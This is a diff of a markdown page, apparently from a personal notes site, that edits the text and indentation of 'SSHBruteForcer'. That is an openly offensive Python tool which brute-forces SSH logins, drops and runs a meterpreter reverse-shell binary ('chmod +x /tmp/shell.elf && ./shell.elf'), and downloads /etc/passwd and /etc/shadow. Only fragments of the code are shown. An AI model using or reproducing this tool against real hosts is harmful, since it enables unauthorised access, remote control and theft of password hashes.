@@ -3,7 +3,7 @@ layout: memory
 title: SSHBruteForcer
 ---
 
-Tiny and simple SSH brute force tool written in Python3 that can return a meterpreter reverse shell. Edit the source code below for your hostname, username, password, and MSF reverse shell details. There is also functionality to automatically download `/etc/passwd` and `/etc/shadow` from the host. This as you might have already figured out is only working if the host has enough access. 
+Tiny and simple SSH brute force tool written in Python3 that can return a meterpreter reverse shell. Edit the source code below for your hostname, username, password, and MSF reverse shell details. There is also functionality to automatically download `/etc/passwd` and `/etc/shadow` from the host. This as you might have already figured out is only working if the host has enough access.
 
 ```python
 #!/usr/bin/python3
@@ -72,19 +72,19 @@ try:
    sftp.close()
 
    while True:
-   	try:  
-   	   stdin, stdout, stderr = client.exec_command('chmod +x /tmp/shell.elf && cd /tmp && ./shell.elf')
-   	   print(stdout.read().decode())
-   	   break
-   	except KeyboardInterupt:
-   	    print("Exited On User Command")
+    try:  
+       stdin, stdout, stderr = client.exec_command('chmod +x /tmp/shell.elf && cd /tmp && ./shell.elf')
+       print(stdout.read().decode())
+       break
+    except KeyboardInterupt:
+        print("Exited On User Command")
    client.close()
 except Exception as err:
    print(str(err))
 
 ```
 
-*Cough* now time for the ugly part of this script: the dependencies. Add these to `requirements.txt` or poetry. Newwer versions of the dependencies should work but I haven't testet them:
+*Cough* now time for the ugly part of this script: the dependencies. Add these to `requirements.txt` or poetry. Newer versions of the dependencies should work but I haven't tested them:
 
 ```
 paramiko==2.7.2
